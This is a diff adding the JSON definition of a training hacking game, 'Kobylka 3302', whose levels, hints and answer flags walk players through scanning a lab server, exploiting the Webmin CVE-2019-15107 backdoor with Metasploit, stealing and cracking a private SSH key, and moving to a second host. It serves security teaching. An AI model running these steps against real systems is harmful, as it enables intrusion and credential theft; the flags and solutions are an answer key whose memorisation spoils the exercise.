@@ -1,0 +1,224 @@
+{
+  "title" : "Uploaded Kobylka 3302",
+  "description" : "Infosec community all over the word has been investigating hacker group\nKobylka 3302. This mysterious organization has been very active in the\nhacker scene and is believed to be responsible for several cyber-attacks.\nRecently you have acquired an IP address of one of their servers. Find out\nwho they are and what do they do. These criminals have to be stopped!",
+  "prerequisities" : [ ],
+  "outcomes" : [ "You will learn how to scan a server, how to find out possible vulnerabilities and how to exploit them." ],
+  "state" : "UNRELEASED",
+  "show_stepper_bar" : true,
+  "levels" : [ {
+    "type" : "AssessmentLevelImportDTO",
+    "title" : "Pre-game Questionnaire",
+    "max_score" : 0,
+    "level_type" : "ASSESSMENT_LEVEL",
+    "order" : 0,
+    "estimated_duration" : 1,
+    "questions" : "[{\"question_type\":\"EMI\",\"rows\":[\"Cybersecurity game\"],\"cols\":[\"Yes\",\"No\"],\"correct_answers\":[{\"x\":-1,\"y\":-1}],\"answer_required\":false,\"order\":0,\"penalty\":0,\"points\":0,\"text\":\"Have you ever played any cybesecurity game (such as CTF) before?\"},{\"question_type\":\"EMI\",\"rows\":[\"nmap\",\"Linux terminal (command line interface)\",\"Metasploit\",\"John the Ripper\",\"Medusa or Hydra\"],\"cols\":[\"Yes\",\"No\"],\"correct_answers\":[{\"x\":-1,\"y\":-1}],\"answer_required\":false,\"order\":1,\"penalty\":0,\"points\":0,\"text\":\"Select tools with which you have hands-on experience, i.e. you have already used them in practice:\"},{\"question_type\":\"EMI\",\"rows\":[\"CVE is used for\"],\"cols\":[\"Identification of an operating system\",\"Identification of an application\",\"Identification of a vulnerability\",\"Identification of an attack\"],\"correct_answers\":[{\"x\":-1,\"y\":-1}],\"answer_required\":false,\"order\":2,\"penalty\":0,\"points\":0,\"text\":\"What is CVE used for?\"},{\"question_type\":\"EMI\",\"rows\":[\"Linux terminal at (almost) daily basis\"],\"cols\":[\"Yes\",\"No\"],\"correct_answers\":[{\"x\":-1,\"y\":-1}],\"answer_required\":false,\"order\":3,\"penalty\":0,\"points\":0,\"text\":\"Have you ever used or do you currently use Linux terminal at (almost) daily basis?\"},{\"question_type\":\"EMI\",\"rows\":[\"Agree\"],\"cols\":[\"Yes\",\"No\"],\"correct_answers\":[{\"x\":-1,\"y\":-1}],\"answer_required\":false,\"order\":4,\"penalty\":0,\"points\":0,\"text\":\"I agree that answers provided in this questionnaire and actions done during the game can be used in anonymized form for research purposes.\"}]",
+    "instructions" : "Please help us making cybersecurity games better and answer the following questions. By analyzing your answers and actions taken during the game, we can improve the games and the entire process of their design.",
+    "assessment_type" : "QUESTIONNAIRE"
+  }, {
+    "type" : "InfoLevelImportDTO",
+    "title" : "Introduction Kobylka 3302",
+    "max_score" : 0,
+    "level_type" : "INFO_LEVEL",
+    "order" : 1,
+    "estimated_duration" : 0,
+    "content" : "Members of the infosec community from all over the world have been investigating a mysterious entity that calls itself **Kobylka 3302**. It is unknown whether it is just one person or a group. Regardless, they have been very active in the hacker scene and they are believed to be responsible for several destructive cyber-attacks. \n\nRecently, we have acquired the IP address of one of their servers. We need you to find out who they are and what their motives are. They are breaking the law and have to be stopped.\n\n\nCredentials to your computer (attacker):\n* `username: root`\n* `password: toor`\n"
+  }, {
+    "type" : "GameLevelImportDTO",
+    "title" : "Scan the IP address!",
+    "max_score" : 10,
+    "level_type" : "GAME_LEVEL",
+    "order" : 2,
+    "estimated_duration" : 2,
+    "flag" : "10000",
+    "content" : "See if the acquired IP address leads anywhere.\n\n`172.18.1.5`\n\n\nFlag: the highest number of an open port",
+    "solution" : "1. open terminal and run command `root@attacker:~# nmap 172.18.1.5`\n2. the highest shown port is 10000\n ",
+    "solution_penalized" : true,
+    "hints" : [ {
+      "title" : "Explicit tool hint",
+      "content" : "Use the command-line tool **nmap**. Type `nmap --help` for some info or `man nmap` for a more comprehensive manual.",
+      "hint_penalty" : 5,
+      "order" : 1
+    }, {
+      "title" : "Vague tool hint",
+      "content" : "The tool to scan IP addresses is already installed on your computer and is commonly used to scan servers and their services.",
+      "hint_penalty" : 2,
+      "order" : 0
+    } ],
+    "incorrect_flag_limit" : 10,
+    "attachments" : [ ],
+    "MITRE_techniques" : {
+      "TA0043.T1595" : "Reconnaissance.Active Scanning"
+    }
+  }, {
+    "type" : "GameLevelImportDTO",
+    "title" : " Identify a vulnerability!",
+    "max_score" : 15,
+    "level_type" : "GAME_LEVEL",
+    "order" : 3,
+    "estimated_duration" : 10,
+    "flag" : "CVE-2019-15107",
+    "content" : "Well done! Now you know what applications are running on the server (`172.18.1.5`). Find out if any of them is vulnerable and choose the right vulnerability to exploit. (Look for a recent one.)\n\nPort 10000 seems to be suspicious!\n\nFlag: CVE of the vulnerability in the format **CVE-XXXX-XXXXX**",
+    "solution" : "There are several ways to find a vulnerability:\n* use Nmap with -sV flag or see /etc/services file - you will find out that Webmin is running on the 10000 port\n* search for \"Webmin exploit\" on google - the correct vulnerability is on the first page\n* in terminal run `searchsploit webmin`\n* open Metasploit console and search for Webmin vulnerabilities\n     `\n     root@attacker:~# msfconsole\n`     `\nmsf5 > search webmin     \n`\n\n The vulnerability you are looking for is **CVE-2019-15107**. It's unauthenticated and recent.",
+    "solution_penalized" : true,
+    "hints" : [ {
+      "title" : "How to start",
+      "content" : "Use Nmap with `-sV` flag. There is also a file on your machine with information about what services are running on what ports.\n",
+      "hint_penalty" : 2,
+      "order" : 0
+    }, {
+      "title" : "Where and what to look for",
+      "content" : "Use **exploit-db.com** or the Searchsploit tool.\n\nLook for recent and unauthenticated exploits.",
+      "hint_penalty" : 4,
+      "order" : 2
+    }, {
+      "title" : "Service hint",
+      "content" : "**Webmin** is running on the 10000 port. \n\nFind the vulnerability of Webmin - try to google it or use a tool on your machine used to search for exploits.\n",
+      "hint_penalty" : 4,
+      "order" : 1
+    } ],
+    "incorrect_flag_limit" : 10,
+    "attachments" : [ ],
+    "MITRE_techniques" : {
+      "TA0043.T1592.002" : "Reconnaissance.Gather Victim Host Information.Software",
+      "TA0042.T1588.006" : "Resource Development.Obtain Capabilities.Vulnerabilities"
+    }
+  }, {
+    "type" : "GameLevelImportDTO",
+    "title" : "Exploit the vulnerability! ",
+    "max_score" : 20,
+    "level_type" : "GAME_LEVEL",
+    "order" : 4,
+    "estimated_duration" : 7,
+    "flag" : "25790",
+    "content" : "The vulnerability CVE-2019-15107 seems promising. Exploit it and gain access to the server (`172.18.1.5`).\n\n\nFlag format: a five-digit number located in a file in the `/root/` directory on the server.\n",
+    "solution" : "`\nroot@attacker:~# msfconsole\n``msf5 > search webmin  \n``msf5 > use exploit/unix/webapp/webmin_backdoor\n``msf5 > show options\n``msf5 > set RHOST 172.18.1.5\n``msf5 > set LHOST 10.1.135.83\n``msf5 > set RPORT 10000\n``msf5 > check``\nmsf5 > exploit\n`After this a new ssh session was created.`\ncd /root/\n``cat WARNING-READ-ME.txt\n`\n\nThe flag is **25790**.",
+    "solution_penalized" : true,
+    "hints" : [ {
+      "title" : "Correct exploit hint",
+      "content" : "There is a `search` command in metasploit (msfconsole). To find out the correct exploit and use it. Additional flags for the search command can be useful! To use the exploit run `use [path of the exploit]`.",
+      "hint_penalty" : 7,
+      "order" : 1
+    }, {
+      "title" : "Tool hint",
+      "content" : "The tool you are looking for is called **Metasploit**. It's a command-line tool. Run it and use a correct exploit.",
+      "hint_penalty" : 5,
+      "order" : 0
+    }, {
+      "title" : "How to use exploit",
+      "content" : "Each exploit has its options - run **show options** to display them. Set the options and run the exploit.",
+      "hint_penalty" : 4,
+      "order" : 2
+    } ],
+    "incorrect_flag_limit" : 10,
+    "attachments" : [ ],
+    "MITRE_techniques" : {
+      "TA0001.T1190" : "Initial Access.Exploit Public-Facing Application",
+      "TA0002.T1059.004" : "Execution.Command and Scripting Interpreter.Unix Shell"
+    }
+  }, {
+    "type" : "GameLevelImportDTO",
+    "title" : "Find an IP address of the secret server!",
+    "max_score" : 20,
+    "level_type" : "GAME_LEVEL",
+    "order" : 5,
+    "estimated_duration" : 10,
+    "flag" : "10.1.17.4-asdfqwer",
+    "content" : "Kobylka 3302 anticipated our attack and notified their members. Most of their data seem to have been deleted, but hopefully, there's still something left elsewhere. Try to find the address of the new server that they moved their files to. \n\nWe're not giving up just yet. Find the IP address!\n\nFlag: IP address of the secret server + secret. **Important!** Ask the teacher before submitting the flag for conformation.",
+    "solution" : "`\nrun ls -a /home/eve\n``display .bash_history file with less .bash_history\n`scp command is used for copying files to remote server, the ip address is 10.1.17.4\n\n\nYou can also use meterpreter to more easily move around the server:\n`\nbackground\n``msf5 > sessions -u 1\n``msf5 > session -i 2\n`\nDownload files with meterpreter with a `download` command.",
+    "solution_penalized" : true,
+    "hints" : [ {
+      "title" : "Where to look for the flag",
+      "content" : "Try to explore a .bash_history file and choose the correct IP address. Don't guess!.",
+      "hint_penalty" : 6,
+      "order" : 1
+    }, {
+      "title" : "Command hint",
+      "content" : "What was the criminal advised to do before deleting his files?",
+      "hint_penalty" : 2,
+      "order" : 2
+    }, {
+      "title" : "How to start",
+      "content" : "Did the hackers delete all their files? Their directories are located at `/home/`.",
+      "hint_penalty" : 4,
+      "order" : 0
+    } ],
+    "incorrect_flag_limit" : 10,
+    "attachments" : [ ],
+    "MITRE_techniques" : {
+      "TA0009.T1005" : "Collection.Data from Local System",
+      "TA0010.T1041" : "Exfiltration.Exfiltration Over C2 Channel"
+    }
+  }, {
+    "type" : "GameLevelImportDTO",
+    "title" : "Crack the passphrase.",
+    "max_score" : 20,
+    "level_type" : "GAME_LEVEL",
+    "order" : 6,
+    "estimated_duration" : 10,
+    "flag" : "!hellokitty!!",
+    "content" : "Very well, we now have the IP of their *\"secret\"* server (`10.1.17.4`). But how do we get in? It is surely heavily guarded. Don't try to search for vulnerabilities, that would be probably a waste of time. Try to search for more interesting files on the server you exploited.\n\nFlag: the flag a passphrase of a certain file",
+    "solution" : "There is a .shh directory with secret key in Eve's directory. Print it on terminal (`cat /home/eve/.ssh/id_rsa`) and copy it to a local file. If you have a meterpreter session, you can download the file with a `download` command. \n\nCreate a hash from private ssh key with john2ssh script and crack it with rockyou.txt wordlist:  \n1. `root@attacker:~# john2ssh id_rsa > hash`\n1. `root@attacker:~# john --wordlist=/usr/share/wordlists/rockyou.txt hash`\n\nThe passphrase and the flag is **!hellokitty!!**\n",
+    "solution_penalized" : true,
+    "hints" : [ {
+      "title" : "What file to look for",
+      "content" : "Eve used scp to connect to the server. scp uses ssh connection to copy files. Try to look for private ssh keys.",
+      "hint_penalty" : 4,
+      "order" : 0
+    }, {
+      "title" : "What to do",
+      "content" : "You cannot use the private ssh key without a passphrase. Use a password-cracking tool to find out what that passphrase is. \n\nAn incremental attack would take too long, use a dictionary attack instead. If the attack is taking too long, try to look for different dictionaries on your machine.",
+      "hint_penalty" : 6,
+      "order" : 1
+    }, {
+      "title" : "Tool hint",
+      "content" : "Use **ssh2john** and **john** with a suitable wordlist.",
+      "hint_penalty" : 6,
+      "order" : 2
+    } ],
+    "incorrect_flag_limit" : 10,
+    "attachments" : [ ],
+    "MITRE_techniques" : {
+      "TA0006.T1552.004" : "Credential Access.Unsecured Credentials.Private Keys",
+      "TA0010.T1041" : "Exfiltration.Exfiltration Over C2 Channel",
+      "TA0006.T1110.002" : "Credential Access.Brute Force.Password Cracking"
+    }
+  }, {
+    "type" : "GameLevelImportDTO",
+    "title" : "Steal ░░▒░ from the other server",
+    "max_score" : 15,
+    "level_type" : "GAME_LEVEL",
+    "order" : 7,
+    "estimated_duration" : 5,
+    "flag" : "58345",
+    "content" : "Conn░ct to the░other server with ssh and look▒aro░nd the file syst▒m.░There must░be som░thi▒g there.\n\n**fLaG: tHE FiRst L1ne oOoF tHe ▒░▒▒░ fiLE in THe ~/t░p-s▒░r▒t diREKTory**;",
+    "solution" : "1. `root@attacker:~# chmod 0600 id_rsa`\n2. `root@attacker:~# ssh -i id_rsa eva@10.1.17.4`\n3. `eve@client:~$ cat top-secret/WARNING-READ-ME.txt`\n\n",
+    "solution_penalized" : true,
+    "hints" : [ {
+      "title" : "What next",
+      "content" : "Use the private .ssh key. You may need to change it's permissions.",
+      "hint_penalty" : 4,
+      "order" : 1
+    }, {
+      "title" : "ssh hint",
+      "content" : "Make sure you're connecting as a correct user.",
+      "hint_penalty" : 4,
+      "order" : 0
+    } ],
+    "incorrect_flag_limit" : 10,
+    "attachments" : [ ],
+    "MITRE_techniques" : {
+      "TA0008.T1021.004" : "Lateral Movement.Remote Services.SSH",
+      "TA0009.T1005" : "Collection.Data from Local System"
+    }
+  }, {
+    "type" : "InfoLevelImportDTO",
+    "title" : "Congratulations",
+    "max_score" : 0,
+    "level_type" : "INFO_LEVEL",
+    "order" : 8,
+    "estimated_duration" : 0,
+    "content" : "You have found us, as we wanted you to. We are not what most say. We know things that the top 1% of the top 1% do not want us to know. We need recruits for fighting against them. We have chosen you. \n\nWe are the future. \n\nExpect us to be contacting you soon. \n\n**▒░░░░░░|<0by1k/\\░3302░▒** \n\n\nEpstein did not kill himself."
+  } ],
+  "estimated_duration" : 45
+}
